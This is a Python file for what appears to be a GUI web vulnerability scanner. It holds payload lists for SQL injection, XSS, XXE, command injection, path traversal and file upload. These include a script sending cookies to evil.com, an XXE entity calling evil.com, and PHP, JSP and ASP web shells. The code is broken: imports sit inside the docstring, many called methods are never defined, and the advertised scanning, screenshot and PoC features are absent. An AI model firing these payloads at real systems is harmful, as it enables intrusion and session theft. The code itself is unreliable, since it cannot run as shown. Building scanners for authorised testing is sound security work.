#!/usr/bin/env python3
"""
Complete VAPT DAST Tool with Screenshots and PoC Generation
OWASP Top 10 & SANS 25 Compliance with Professional Reporting
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import threading
from urllib.parse import urlparse
import time
from datetime import datetime
import json

Features: Black Box & Grey Box Testing
- Automated Screenshot Capture
- PoC Generation for Each Vulnerability  
- OWASP Top 10 2021 Coverage
- SANS 25 Critical Security Errors
- Detailed Remediation Steps
- Professional HTML Reports
- Real-time Testing Dashboard

Requirements:
pip install requests selenium beautifulsoup4 jinja2 weasyprint pillow

Usage:
python3 vapt_dast_tool.py

Author: Security Team
Version: 4.0 - Professional VAPT Edition
"""

import requests
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import json
import threading
import time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
import re
import base64
import hashlib
import random
import string
from pathlib import Path
import sqlite3
import sys
import warnings
import urllib3
import os
import subprocess
from typing import Dict, List, Optional, Tuple

# Optional imports with fallbacks
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Suppress warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VAPTDASTTool:
    def __init__(self, root):
        self.root = root
        self.root.title("🛡️ Professional VAPT DAST Tool v4.0")
        self.root.geometry("1600x1000")
        self.root.configure(bg='#0d1117')
        
        # Core configuration
        self.setup_session()
        self.vulnerabilities = []
        self.is_testing = False
        self.current_scan_id = None
        self.driver = None
        self.authenticated = False
        
        # Create comprehensive directory structure
        self.setup_directories()
        
        # Initialize components
        self.init_database()
        self.load_comprehensive_payloads()
        self.setup_owasp_sans_mappings()
        
        # Create professional interface
        self.create_professional_interface()
        
        # Display startup information
        self.display_startup_info()
        
    def setup_session(self):
        """Configure HTTP session with security settings"""
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 30
        self.session.max_redirects = 5
        
        # Professional user agents for different testing scenarios
        self.user_agents = {
            'chrome_windows': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'firefox_linux': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'safari_mac': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'mobile_android': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
    def setup_directories(self):
        """Create comprehensive directory structure"""
        self.results_dir = Path("VAPT_DAST_Results")
        self.results_dir.mkdir(exist_ok=True)
        
        # Create subdirectories
        self.screenshots_dir = self.results_dir / "screenshots"
        self.screenshots_dir.mkdir(exist_ok=True)
        
        self.reports_dir = self.results_dir / "reports"
        self.reports_dir.mkdir(exist_ok=True)
        
        self.poc_dir = self.results_dir / "poc_files"
        self.poc_dir.mkdir(exist_ok=True)
        
        self.evidence_dir = self.results_dir / "evidence"
        self.evidence_dir.mkdir(exist_ok=True)
        
        self.templates_dir = self.results_dir / "templates"
        self.templates_dir.mkdir(exist_ok=True)
        
    def init_database(self):
        """Initialize comprehensive vulnerability database"""
        self.db_path = self.results_dir / "vapt_vulnerabilities.db"
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        # Comprehensive vulnerability table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id TEXT,
                timestamp TEXT NOT NULL,
                target_url TEXT NOT NULL,
                vulnerability_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                risk_rating REAL,
                cvss_score REAL,
                cwe_id TEXT,
                owasp_category TEXT,
                sans_category TEXT,
                title TEXT NOT NULL,
                description TEXT,
                technical_details TEXT,
                poc_steps TEXT,
                remediation TEXT,
                mitigation TEXT,
                references TEXT,
                screenshot_path TEXT,
                poc_file_path TEXT,
                request_data TEXT,
                response_data TEXT,
                payload_used TEXT,
                exploit_complexity TEXT,
                business_impact TEXT,
                verification_status TEXT DEFAULT 'UNVERIFIED',
                false_positive INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Scan sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id TEXT UNIQUE,
                target_url TEXT NOT NULL,
                scan_mode TEXT NOT NULL,
                authentication_used INTEGER DEFAULT 0,
                start_time DATETIME DEFAULT CURRENT_TIMESTAMP,
                end_time DATETIME,
                total_vulnerabilities INTEGER DEFAULT 0,
                critical_count INTEGER DEFAULT 0,
                high_count INTEGER DEFAULT 0,
                medium_count INTEGER DEFAULT 0,
                low_count INTEGER DEFAULT 0,
                info_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'RUNNING',
                scan_config TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def load_comprehensive_payloads(self):
        """Load comprehensive security testing payloads"""
        
        # SQL Injection payloads (CWE-89, OWASP A03)
        self.sql_payloads = {
            'basic': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1'--",
                "admin'--",
                "' OR 1=1#"
            ],
            'union': [
                "' UNION SELECT 1,username,password FROM users--",
                "' UNION SELECT null,user(),version()--",
                "' UNION SELECT 1,2,3,4,5--"
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)--"
            ],
            'error_based': [
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ]
        }
        
        # XSS payloads (CWE-79, OWASP A03)
        self.xss_payloads = {
            'reflected': [
                "<script>alert('XSS-VAPT-Test')</script>",
                "<img src=x onerror=alert('XSS-VAPT-Test')>",
                "<svg onload=alert('XSS-VAPT-Test')>",
                "javascript:alert('XSS-VAPT-Test')",
                "'\"><script>alert('XSS-VAPT-Test')</script>"
            ],
            'dom': [
                "<script>document.write('XSS-VAPT-Test')</script>",
                "<iframe src=javascript:alert('XSS-VAPT-Test')></iframe>",
                "<body onload=alert('XSS-VAPT-Test')>"
            ],
            'stored': [
                "<script>fetch('/admin/delete-user?id=1')</script>",
                "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
                "<script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin/users');xhr.send();</script>"
            ],
            'filter_bypass': [
                "<ScRiPt>alert('XSS-VAPT-Test')</ScRiPt>",
                "<script>al\\u0065rt('XSS-VAPT-Test')</script>",
                "<img src=\"x\" onerror=\"alert('XSS-VAPT-Test')\">",
                "<%2fscript><%2fscript>alert('XSS-VAPT-Test')<%2fscript>"
            ]
        }
        
        # Path traversal payloads (CWE-22)
        self.path_traversal_payloads = {
            'linux': [
                "../../../etc/passwd",
                "../../../etc/shadow",
                "../../../etc/hosts",
                "../../../proc/version",
                "../../../var/log/apache2/access.log"
            ],
            'windows': [
                "..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\windows\\system.ini",
                "..\\..\\..\\boot.ini"
            ],
            'encoded': [
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]
        }
        
        # Command injection payloads (CWE-78)
        self.command_injection_payloads = {
            'unix': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "`id`",
                "$(whoami)",
                "; uname -a",
                "| ps aux"
            ],
            'windows': [
                "& dir",
                "| type C:\\windows\\win.ini",
                "&& ver",
                "& systeminfo",
                "| whoami",
                "&& net user"
            ],
            'blind': [
                "; sleep 10",
                "& ping -n 10 127.0.0.1",
                "| timeout 10",
                "&& ping -c 10 127.0.0.1"
            ]
        }
        
        # File upload payloads (CWE-434)
        self.file_upload_payloads = {
            'php_shell': [
                "<?php system($_GET['cmd']); ?>",
                "<?php eval($_POST['code']); ?>",
                "<?php phpinfo(); ?>"
            ],
            'jsp_shell': [
                "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "<% out.println(\"VAPT-File-Upload-Test\"); %>"
            ],
            'asp_shell': [
                "<%eval request(\"cmd\")%>",
                "<%Response.Write(\"VAPT-File-Upload-Test\")%>"
            ]
        }
        
        # XXE payloads (CWE-611)
        self.xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]>
<root>&xxe;</root>'''
        ]
        
        # LDAP injection payloads (CWE-90)
        self.ldap_injection_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00"
        ]
        
        # NoSQL injection payloads
        self.nosql_injection_payloads = [
            "' || '1'=='1",
            "'; return db.users.find(); var dummy='",
            "[$ne]=null",
            "[$regex]=.*"
        ]
        
    def setup_owasp_sans_mappings(self):
        """Setup OWASP Top 10 and SANS 25 mappings"""
        
        self.owasp_2021_mappings = {
            'A01': {
                'name': 'Broken Access Control',
                'description': 'Restrictions on what authenticated users are allowed to do are often not properly enforced.',
                'cwe_ids': ['CWE-22', 'CWE-284', 'CWE-285', 'CWE-639']
            },
            'A02': {
                'name': 'Cryptographic Failures',
                'description': 'Failures related to cryptography which often leads to sensitive data exposure.',
                'cwe_ids': ['CWE-259', 'CWE-327', 'CWE-331']
            },
            'A03': {
                'name': 'Injection',
                'description': 'An application is vulnerable to attack when user-supplied data is not validated, filtered, or sanitized.',
                'cwe_ids': ['CWE-79', 'CWE-89', 'CWE-73']
            },
            'A04': {
                'name': 'Insecure Design',
                'description': 'Risks related to design flaws, calling for more use of threat modeling, secure design patterns.',
                'cwe_ids': ['CWE-209', 'CWE-256', 'CWE-501', 'CWE-522']
            },
            'A05': {
                'name': 'Security Misconfiguration',
                'description': 'Missing appropriate security hardening across any part of the application stack.',
                'cwe_ids': ['CWE-16', 'CWE-260']
            },
            'A06': {
                'name': 'Vulnerable and Outdated Components',
                'description': 'You are likely vulnerable if you do not know the versions of all components you use.',
                'cwe_ids': ['CWE-1104']
            },
            'A07': {
                'name': 'Identification and Authentication Failures',
                'description': 'Confirmation of the user identity, authentication, and session management is critical.',
                'cwe_ids': ['CWE-297', 'CWE-287', 'CWE-384']
            },
            'A08': {
                'name': 'Software and Data Integrity Failures',
                'description': 'Code and infrastructure that does not protect against integrity violations.',
                'cwe_ids': ['CWE-829', 'CWE-494']
            },
            'A09': {
                'name': 'Security Logging and Monitoring Failures',
                'description': 'This category is to help detect, escalate, and respond to active breaches.',
                'cwe_ids': ['CWE-778', 'CWE-117']
            },
            'A10': {
                'name': 'Server-Side Request Forgery (SSRF)',
                'description': 'SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL.',
                'cwe_ids': ['CWE-918']
            }
        }
        
        self.sans_25_critical = {
            'CWE-79': 'Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)',
            'CWE-89': 'Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)',
            'CWE-20': 'Improper Input Validation',
            'CWE-125': 'Out-of-bounds Read',
            'CWE-119': 'Improper Restriction of Operations within the Bounds of a Memory Buffer',
            'CWE-22': 'Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)',
            'CWE-352': 'Cross-Site Request Forgery (CSRF)',
            'CWE-434': 'Unrestricted Upload of File with Dangerous Type',
            'CWE-862': 'Missing Authorization',
            'CWE-78': 'Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)'
        }
        
    def create_professional_interface(self):
        """Create professional VAPT interface"""
        # Configure professional styling
        style = ttk.Style()
        style.theme_use('clam')
        
        # Define professional color scheme
        colors = {
            'bg_primary': '#0d1117',
            'bg_secondary': '#161b22',
            'bg_tertiary': '#21262d',
            'text_primary': '#f0f6fc',
            'text_secondary': '#7d8590',
            'accent_blue': '#58a6ff',
            'accent_green': '#56d364',
            'accent_red': '#f85149',
            'accent_yellow': '#d29922',
            'accent_orange': '#ff7b72'
        }
        
        # Main container with professional layout
        main_container = tk.Frame(self.root, bg=colors['bg_primary'])
        main_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Professional header
        self.create_professional_header(main_container, colors)
        
        # Create notebook for tabbed interface
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=(15, 0))
        
        # Main testing tab
        self.create_testing_tab(colors)
        
        # Vulnerability analysis tab
        self.create_vulnerability_tab(colors)
        
        # Reporting tab
        self.create_reporting_tab(colors)
        
        # Configuration tab
        self.create_configuration_tab(colors)
        
        # Professional status bar
        self.create_professional_statusbar(main_container, colors)
        
    def create_professional_header(self, parent, colors):
        """Create professional header with branding"""
        header_frame = tk.Frame(parent, bg=colors['bg_primary'])
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Main title with professional styling
        title_frame = tk.Frame(header_frame, bg=colors['bg_primary'])
        title_frame.pack(fill=tk.X)
        
        main_title = tk.Label(title_frame, 
                             text="🛡️ Professional VAPT DAST Tool", 
                             font=('Segoe UI', 24, 'bold'),
                             fg=colors['accent_blue'], 
                             bg=colors['bg_primary'])
        main_title.pack(side=tk.LEFT)
        
        version_label = tk.Label(title_frame,
                                text="v4.0 Enterprise Edition",
                                font=('Segoe UI', 12),
                                fg=colors['text_secondary'],
                                bg=colors['bg_primary'])
        version_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # Compliance badges
        compliance_frame = tk.Frame(header_frame, bg=colors['bg_primary'])
        compliance_frame.pack(fill=tk.X, pady=(5, 0))
        
        badges = [
            ("OWASP Top 10 2021", colors['accent_green']),
            ("SANS 25 Critical", colors['accent_orange']),
            ("Professional PoC", colors['accent_blue']),
            ("Screenshot Capture", colors['accent_yellow'])
        ]
        
        for badge_text, badge_color in badges:
            badge = tk.Label(compliance_frame,
                           text=f"✓ {badge_text}",
                           font=('Segoe UI', 10, 'bold'),
                           fg=badge_color,
                           bg=colors['bg_primary'])
            badge.pack(side=tk.LEFT, padx=(0, 20))
            
    def create_testing_tab(self, colors):
        """Create comprehensive testing tab"""
        testing_frame = tk.Frame(self.notebook, bg=colors['bg_secondary'])
        self.notebook.add(testing_frame, text="🎯 Security Testing")
        
        # Target configuration section
        self.create_target_config_section(testing_frame, colors)
        
        # Testing options section
        self.create_testing_options_section(testing_frame, colors)
        
        # Progress and control section
        self.create_progress_control_section(testing_frame, colors)
        
        # Real-time results section
        self.create_realtime_results_section(testing_frame, colors)
        
    def create_target_config_section(self, parent, colors):
        """Create target configuration section"""
        config_frame = tk.LabelFrame(parent, 
                                   text="🎯 Target Configuration",
                                   bg=colors['bg_tertiary'],
                                   fg=colors['text_primary'],
                                   font=('Segoe UI', 12, 'bold'))
        config_frame.pack(fill=tk.X, padx=15, pady=15)
        
        # URL configuration
        url_frame = tk.Frame(config_frame, bg=colors['bg_tertiary'])
        url_frame.pack(fill=tk.X, padx=15, pady=10)
        
        tk.Label(url_frame, text="Target URL:", 
                font=('Segoe UI', 11, 'bold'),
                fg=colors['text_primary'], 
                bg=colors['bg_tertiary']).pack(side=tk.LEFT)
        
        self.url_entry = tk.Entry(url_frame, 
                                font=('Segoe UI', 11),
                                bg=colors['bg_primary'], 
                                fg=colors['text_primary'],
                                insertbackground=colors['text_primary'],
                                relief=tk.FLAT,
                                bd=2)
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(10, 0))
        self.url_entry.insert(0, "https://httpbin.org")
        
        # Testing mode selection
        mode_frame = tk.Frame(config_frame, bg=colors['bg_tertiary'])
        mode_frame.pack(fill=tk.X, padx=15, pady=5)
        
        tk.Label(mode_frame, text="Testing Mode:",
                font=('Segoe UI', 11, 'bold'),
                fg=colors['text_primary'],
                bg=colors['bg_tertiary']).pack(side=tk.LEFT)
        
        self.testing_mode = tk.StringVar(value="blackbox")
        
        mode_options = [
            ("🕵️ Black Box Testing", "blackbox", "External security assessment without credentials"),
            ("🔍 Grey Box Testing", "greybox", "Authenticated testing with valid credentials")
        ]
        
        for text, value, tooltip in mode_options:
            rb = tk.Radiobutton(mode_frame, text=text,
                              variable=self.testing_mode,
                              value=value,
                              font=('Segoe UI', 10),
                              bg=colors['bg_tertiary'],
                              fg=colors['text_primary'],
                              selectcolor=colors['bg_primary'],
                              command=self.on_mode_change)
            rb.pack(side=tk.LEFT, padx=(20, 15))
            
        # Authentication section (for Grey Box)
        self.auth_frame = tk.LabelFrame(config_frame,
                                      text="🔐 Authentication (Grey Box Mode)",
                                      bg=colors['bg_tertiary'],
                                      fg=colors['text_primary'],
                                      font=('Segoe UI', 10, 'bold'))
        self.auth_frame.pack(fill=tk.X, padx=15, pady=10)
        
        auth_grid = tk.Frame(self.auth_frame, bg=colors['bg_tertiary'])
        auth_grid.pack(fill=tk.X, padx=10, pady=10)
        
        # Username
        tk.Label(auth_grid, text="Username:",
                font=('Segoe UI', 10),
                fg=colors['text_primary'],
                bg=colors['bg_tertiary']).grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        
        self.username_entry = tk.Entry(auth_grid,
                                     font=('Segoe UI', 10),
                                     bg=colors['bg_primary'],
                                     fg=colors['text_primary'],
                                     insertbackground=colors['text_primary'],
                                     width=25)
        self.username_entry.grid(row=0, column=1, padx=(0, 20))
        
        # Password
        tk.Label(auth_grid, text="Password:",
                font=('Segoe UI', 10),
                fg=colors['text_primary'],
                bg=colors['bg_tertiary']).grid(row=0, column=2, sticky=tk.W, padx=(0, 10))
        
        self.password_entry = tk.Entry(auth_grid,
                                     font=('Segoe UI', 10),
                                     bg=colors['bg_primary'],
                                     fg=colors['text_primary'],
                                     insertbackground=colors['text_primary'],
                                     show="*",
                                     width=25)
        self.password_entry.grid(row=0, column=3, padx=(0, 20))
        
        # Login URL
        tk.Label(auth_grid, text="Login URL:",
                font=('Segoe UI', 10),
                fg=colors['text_primary'],
                bg=colors['bg_tertiary']).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=(10, 0))
        
        self.login_url_entry = tk.Entry(auth_grid,
                                      font=('Segoe UI', 10),
                                      bg=colors['bg_primary'],
                                      fg=colors['text_primary'],
                                      insertbackground=colors['text_primary'],
                                      width=60)
        self.login_url_entry.grid(row=1, column=1, columnspan=3, sticky=tk.W+tk.E, pady=(10, 0))
        
        # Initially disable auth frame
        self.toggle_auth_frame(False)
        
    def create_testing_options_section(self, parent, colors):
        """Create comprehensive testing options"""
        options_frame = tk.LabelFrame(parent,
                                    text="🔧 Testing Configuration",
                                    bg=colors['bg_tertiary'],
                                    fg=colors['text_primary'],
                                    font=('Segoe UI', 12, 'bold'))
        options_frame.pack(fill=tk.X, padx=15, pady=(0, 15))
        
        # Create notebook for test categories
        test_notebook = ttk.Notebook(options_frame)
        test_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # OWASP Top 10 Tests
        owasp_frame = tk.Frame(test_notebook, bg=colors['bg_tertiary'])
        test_notebook.add(owasp_frame, text="🛡️ OWASP Top 10 2021")
        
        self.owasp_vars = {}
        owasp_tests = [
            ("A01_broken_access", "A01: Broken Access Control", "Test for unauthorized access and privilege escalation"),
            ("A02_crypto_failures", "A02: Cryptographic Failures", "Test for weak encryption and data exposure"),
            ("A03_injection", "A03: Injection", "Test for SQL, XSS, and other injection attacks"),
            ("A04_insecure_design", "A04: Insecure Design", "Test for design and architectural flaws"),
            ("A05_security_misconfig", "A05: Security Misconfiguration", "Test for configuration weaknesses"),
            ("A06_vulnerable_components", "A06: Vulnerable Components", "Test for outdated and vulnerable libraries"),
            ("A07_auth_failures", "A07: Authentication Failures", "Test for authentication and session issues"),
            ("A08_integrity_failures", "A08: Software/Data Integrity", "Test for integrity validation issues"),
            ("A09_logging_monitoring", "A09: Logging & Monitoring", "Test for insufficient logging and monitoring"),
            ("A10_ssrf", "A10: Server-Side Request Forgery", "Test for SSRF vulnerabilities")
        ]
        
        for i, (key, name, desc) in enumerate(owasp_tests):
            var = tk.BooleanVar(value=True)
            self.owasp_vars[key] = var
            
            cb_frame = tk.Frame(owasp_frame, bg=colors['bg_tertiary'])
            cb_frame.pack(fill=tk.X, padx=10, pady=2)
            cb = tk.Checkbutton(cb_frame, text=name,
                                variable=var,
                                font=('Segoe UI', 10),
                                bg=colors['bg_tertiary'],
                                fg=colors['text_primary'],
                                selectcolor=colors['bg_primary'])
            cb.pack(side=tk.LEFT)
            desc_label = tk.Label(cb_frame, text=desc,
                                  font=('Segoe UI', 9),
                                  fg=colors['text_secondary'],
                                  bg=colors['bg_tertiary'])
            desc_label.pack(side=tk.LEFT, padx=(10, 0))

if __name__ == "__main__":
    root = tk.Tk()
    app = VAPTDASTTool(root)
    root.mainloop()
